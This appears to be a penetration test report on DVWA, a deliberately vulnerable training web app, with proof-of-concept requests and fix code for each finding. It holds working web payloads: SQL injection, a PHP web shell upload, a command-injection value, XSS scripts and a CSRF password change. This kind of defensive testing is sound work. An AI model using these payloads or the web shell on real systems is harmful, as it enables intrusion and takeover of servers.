# Penetration Test Report

## Executive Summary

A penetration test was conducted on **http://172.17.0.2** (DVWA v1.10 - Damn Vulnerable Web Application) in **pentest mode**. The target is a deliberately vulnerable web application designed for security training. Multiple critical and high-severity vulnerabilities were identified across various categories including SQL Injection, Command Injection, Cross-Site Scripting (XSS), File Upload, and Cross-Site Request Forgery (CSRF).

**Overall Assessment**: Critical vulnerabilities present that allow full system compromise.

---

## 1. Target Information

| Attribute | Value |
|-----------|-------|
| Target URL | http://172.17.0.2 |
| IP Address | 172.17.0.2 |
| Web Server | Apache/2.4.25 (Debian) |
| Backend Database | MySQL |
| PHP Version | 7.0.30-0+deb9u1 |
| Application | DVWA v1.10 (Development) |
| Security Level | low |
| MySQL Credentials | user: app, db: dvwa |

---

## 2. Reconnaissance Results

### Technology Stack Identified
- **Web Server**: Apache 2.4.25 (Debian)
- **Backend**: MySQL
- **Frontend**: PHP 7.0.30
- **Application**: DVWA (Damn Vulnerable Web Application)
- **Session Management**: PHP sessions (PHPSESSID)

### Directories/Endpoints Discovered (via Nikto)
- `/config/` - Directory listing enabled, configuration files exposed
- `/docs/` - Directory listing enabled
- `/login.php` - Admin login page
- `/.gitignore` - Git configuration exposed

### Security Headers Analysis
| Header | Status |
|--------|--------|
| X-Frame-Options | Missing |
| X-Content-Type-Options | Missing |
| HSTS | Not set |
| Content-Security-Policy | Not set |
| HttpOnly cookies | Not set |

---

## 3. Vulnerability Findings

### Critical

#### Finding: SQL Injection (SQLi)
| Attribute | Value |
|-----------|-------|
| Severity | Critical |
| CVSS | 9.8 |
| Endpoint | http://172.17.0.2/vulnerabilities/sqli/ |
| Method | GET - parameter: `id` |

**Proof of Concept**:

Step 1 — Request sent:
```
GET /vulnerabilities/sqli/?id=1'+OR+1=1+--+&Submit=Submit# HTTP/1.1
Host: 172.17.0.2
```

Step 2 — Output received:
```
ID: 1' OR 1=1 -- 
First name: admin
Surname: admin
ID: 1' OR 1=1 -- 
First name: Gordon
Surname: Brown
ID: 1' OR 1=1 -- 
First name: Hack
Surname: Me
ID: 1' OR 1=1 -- 
First name: Pablo
Surname: Picasso
ID: 1' OR 1=1 -- 
First name: Bob
Surname: Smith
```

**What this proves**: Unsanitized user input in the `id` parameter is directly concatenated into SQL query, allowing full database enumeration including user credentials.

**Escalation potential**: Extract database schema, read sensitive data, potentially write files via `INTO OUTFILE` for RCE.

**Impact**: Complete database compromise, exposure of all user credentials (admin/password), potential system takeover.

**Recommendation**: Use prepared statements/parameterized queries:
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $_GET['id']]);
```

---

#### Finding: Remote Code Execution (RCE) via File Upload
| Attribute | Value |
|-----------|-------|
| Severity | Critical |
| CVSS | 10.0 |
| Endpoint | http://172.17.0.2/vulnerabilities/upload/ |
| Method | POST - parameter: `uploaded` |

**Proof of Concept**:

Step 1 — Request sent:
```
POST /vulnerabilities/upload/ HTTP/1.1
Host: 172.17.0.2
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET["cmd"]); ?>
------WebKitFormBoundary
Content-Disposition: form-data; name="Upload"

Upload
------WebKitFormBoundary--
```

Step 2 — Output received:
```
../../hackable/uploads/shell.php succesfully uploaded!
```

Step 3 — Command execution:
```
GET /hackable/uploads/shell.php?cmd=id HTTP/1.1

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**What this proves**: Arbitrary PHP files can be uploaded and executed, providing direct Remote Code Execution as www-data user.

**Escalation potential**: Upgrade to root via kernel exploits, lateral movement, data exfiltration.

**Impact**: Complete server compromise, ability to execute arbitrary commands.

**Recommendation**: Implement file type validation, verify file content (magic bytes), store files outside web root, disable PHP execution in upload directory:
```php
$allowed = ['jpg', 'jpeg', 'png', 'gif'];
$ext = strtolower(pathinfo($_FILES['uploaded']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed)) die('File type not allowed');
```

---

#### Finding: Command Injection
| Attribute | Value |
|-----------|-------|
| Severity | Critical |
| CVSS | 9.8 |
| Endpoint | http://172.17.0.2/vulnerabilities/exec/ |
| Method | POST - parameter: `ip` |

**Proof of Concept**:

Step 1 — Request sent:
```
POST /vulnerabilities/exec/ HTTP/1.1
Host: 172.17.0.2

ip=127.0.0.1%3Bid&Submit=Submit
```

Step 2 — Output received:
```
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.088 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.111 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.096 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.091 ms
--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max/stddev = 0.088/0.097/0.113/0.000 ms
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**What this proves**: User input is passed directly to shell_exec() without sanitization; attacker controls OS commands as www-data.

**Escalation potential**: Upload reverse shell, privilege escalation, pivot to other systems.

**Impact**: Remote code execution as web server user.

**Recommendation**: Use process execution functions with array arguments or validate input against IP regex:
```php
if (!filter_var($_POST['ip'], FILTER_VALIDATE_IP)) {
    die('Invalid IP address');
}
$proc = proc_open('ping -c 4 ' . escapeshellarg($_POST['ip']), $des, $pipes);
```

---

### High

#### Finding: Stored Cross-Site Scripting (XSS)
| Attribute | Value |
|-----------|-------|
| Severity | High |
| CVSS | 7.2 |
| Endpoint | http://172.17.0.2/vulnerabilities/xss_s/ |
| Method | POST - parameters: `txtName`, `mtxMessage` |

**Proof of Concept**:

Step 1 — Request sent:
```
POST /vulnerabilities/xss_s/ HTTP/1.1
Host: 172.17.0.2

txtName=test&mtxMessage=<script>alert(1)</script>&btnSign=Sign+Guestbook
```

Step 2 — Output received:
```
<div id="guestbook_comments">Name: test<br />Message: <script>alert(1)</script><br /></div>
```

**What this proves**: User-supplied input is stored and rendered without sanitization or encoding, allowing persistent JavaScript execution.

**Escalation potential**: Session hijacking via cookie theft, keylogging, phishing, defacement.

**Impact**: Compromise of other users viewing the guestbook.

**Recommendation**: Output encoding and content security policy:
```php
htmlspecialchars($message, ENT_QUOTES, 'UTF-8');
header("Content-Security-Policy: default-src 'self'");
```

---

#### Finding: Reflected Cross-Site Scripting (XSS)
| Attribute | Value |
|-----------|-------|
| Severity | High |
| CVSS | 7.3 |
| Endpoint | http://172.17.0.2/vulnerabilities/xss_r/ |
| Method | GET - parameter: `name` |

**Proof of Concept**:

Step 1 — Request sent:
```
GET /vulnerabilities/xss_r/?name=<script>alert(1)</script># HTTP/1.1
Host: 172.17.0.2
```

Step 2 — Output received:
```
<pre>Hello <script>alert(1)</script></pre>
```

**What this proves**: User input is reflected in the response without sanitization, enabling script execution.

**Escalation potential**: Session hijacking, credential theft, redirect to malicious sites.

**Impact**: Attackers can execute JavaScript in victim's browser.

**Recommendation**: Same as stored XSS - implement output encoding.

---

#### Finding: Cross-Site Request Forgery (CSRF)
| Attribute | Value |
|-----------|-------|
| Severity | High |
| CVSS | 7.5 |
| Endpoint | http://172.17.0.2/vulnerabilities/csrf/ |
| Method | GET - parameters: `password_new`, `password_conf` |

**Proof of Concept**:

Step 1 — Request sent:
```
GET /vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change HTTP/1.1
Host: 172.17.0.2
Cookie: PHPSESSID=aep744hskc4otqhdjoft52tib2; security=low
```

Step 2 — Output received:
```
<pre>Password Changed.</pre>
```

**What this proves**: Password change can be triggered without anti-CSRF token; attacker can change victim's password.

**Escalation potential**: Account takeover by changing admin password.

**Impact**: Account takeover, privilege escalation.

**Recommendation**: Implement CSRF tokens and validate origin:
```php
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));
// In form: <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
// On submit: if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) die('CSRF invalid');
```

---

### Medium

#### Finding: Directory Listing Enabled
| Attribute | Value |
|-----------|-------|
| Severity | Medium |
| CVSS | 4.3 |
| Endpoint | http://172.17.0.2/config/ |
| Method | GET |

**Proof of Concept**:

Step 1 — Request sent:
```
GET /config/ HTTP/1.1
Host: 172.17.0.2
```

Step 2 — Output received:
```
Index of /config
config.inc.php
config.inc.php.dist
```

**What this proves**: Directory listing exposes configuration files to unauthenticated users.

**Escalation potential**: Access to database credentials, further enumeration.

**Impact**: Information disclosure, exposure of sensitive configuration.

**Recommendation**: Disable directory listing in Apache config:
```apache
<Directory /var/www/html/config>
    Options -Indexes
</Directory>
```

---

#### Finding: Missing Security Headers
| Attribute | Value |
|-----------|-------|
| Severity | Medium |
| CVSS | 4.8 |
| Endpoint | http://172.17.0.2/ |
| Method | GET |

**Proof of Concept**:

Step 1 — Request sent:
```
GET / HTTP/1.1
Host: 172.17.0.2
```

Step 2 — Output received (relevant headers):
```
HTTP/1.1 302 Found
Server: Apache/2.4.25 (Debian)
Set-Cookie: PHPSESSID=aep744hskc4otqhdjoft52tib2; path=/
Set-Cookie: security=low
```

**What this proves**: Critical security headers (HSTS, X-Frame-Options, CSP) are missing; cookies lack HttpOnly flag.

**Escalation potential**: XSS cookie theft, clickjacking, man-in-the-middle attacks.

**Impact**: Reduced defense-in-depth, easier exploitation of XSS.

**Recommendation**: Add security headers:
```php
header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header('Content-Security-Policy: default-src \'self\'');
```

---

### Low / Informational

#### Finding: Outdated Apache Version
| Attribute | Value |
|-----------|-------|
| Severity | Low |
| CVSS | 3.7 |
| Endpoint | http://172.17.0.2/ |
| Method | N/A |

**Proof of Concept**: Server header reveals `Apache/2.4.25` which is outdated (current is 2.4.54+).

**Recommendation**: Upgrade to latest Apache version.

---

## 4. Risk Matrix

| ID | Finding | Severity | CVSS | Exploitability | Remediation Priority |
|----|---------|----------|------|----------------|---------------------|
| 1 | SQL Injection | Critical | 9.8 | Easy | Immediate |
| 2 | RCE via File Upload | Critical | 10.0 | Easy | Immediate |
| 3 | Command Injection | Critical | 9.8 | Easy | Immediate |
| 4 | Stored XSS | High | 7.2 | Easy | High |
| 5 | Reflected XSS | High | 7.3 | Easy | High |
| 6 | CSRF | High | 7.5 | Easy | High |
| 7 | Directory Listing | Medium | 4.3 | Easy | Medium |
| 8 | Missing Security Headers | Medium | 4.8 | Easy | Medium |
| 9 | Outdated Apache | Low | 3.7 | Medium | Low |

---

## 5. Recommendations

1. **Immediate (Critical)**:
   - Fix SQL injection with prepared statements
   - Implement file type validation for uploads
   - Sanitize command injection inputs
   - Remove uploaded shell files

2. **High Priority**:
   - Implement CSRF tokens on all state-changing forms
   - Add output encoding for XSS prevention
   - Set HttpOnly and Secure flags on cookies

3. **Medium Priority**:
   - Disable directory listing
   - Add security headers (HSTS, CSP, X-Frame-Options)
   - Update Apache to latest version

4. **Long-term**:
   - Implement WAF
   - Regular penetration testing
   - Security awareness training for developers

---

## 6. Testing Timeline

| Date | Activity |
|------|----------|
| 2026-02-26 21:38 | Initial reconnaissance (curl, nikto) |
| 2026-02-26 21:40 | Login to DVWA (admin/password) |
| 2026-02-26 21:42 | Database setup |
| 2026-02-26 21:45 | SQL Injection confirmed |
| 2026-02-26 21:47 | Command Injection confirmed |
| 2026-02-26 21:50 | XSS (Reflected/Stored) confirmed |
| 2026-02-26 21:52 | File Upload RCE confirmed |
| 2026-02-26 21:55 | CSRF confirmed |
| 2026-02-26 22:00 | Report generation |

---

## 7. Appendix

### Tools Used
- curl (manual HTTP requests)
- Nikto (web vulnerability scanning)
- Manual exploitation of DVWA vulnerabilities

### Authentication
- Default credentials: admin / password
- Security level: low (intentionally vulnerable)

### Note
This is a deliberately vulnerable application (DVWA) used for security training. The vulnerabilities found are intentional and part of the application's design.
